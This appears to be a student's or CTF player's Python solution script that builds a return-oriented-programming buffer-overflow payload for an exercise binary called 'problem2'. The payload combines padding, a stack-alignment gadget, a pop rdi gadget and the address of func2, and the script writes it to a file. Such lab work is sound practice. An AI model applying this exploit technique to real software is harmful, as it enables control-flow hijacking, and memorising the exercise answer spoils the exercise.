# solve2.py (Correct Gadgets and Stack Alignment)
import struct

def p64(addr):
    return struct.pack('<Q', addr)

# 偏移量，从缓冲区到覆盖返回地址之前的位置 (16字节)
padding = b"A" * 16

# --- ROP Chain ---

# Gadget 1: 一个 'ret' 指令的地址，用于修复栈对齐
# 验证指令: objdump -d problem2 | grep -A 1 "<_init>:"
# 地址: 0x40101a
stack_align_gadget = p64(0x40101a)

# Gadget 2: 一个 'pop rdi; ret' 指令序列的地址，用于给 func2 传参
# 验证指令: objdump -d problem2 | grep -A 2 "pop    %rdi"
# 地址: 0x4012c7
pop_rdi_gadget = p64(0x4012c7)

# func2 的参数: 1016 (0x3f8)
func2_arg = p64(1016)

# 目标函数 func2 的地址
func2_addr = p64(0x401216)

# 组合 ROP 链
rop_chain = stack_align_gadget + pop_rdi_gadget + func2_arg + func2_addr

# --- 填充以满足 memcpy 的56字节复制长度 ---
# 当前 payload: padding(16) + rop_chain(32) = 48 字节
# 需要补充: 56 - 48 = 8 字节
junk_padding = b"B" * 8

# 组装最终 payload
payload = padding + rop_chain + junk_padding

# 写入文件
with open("ans2.txt", "wb") as f:
    f.write(payload)

print("Final, correct payload for problem2 has been written to ans2.txt")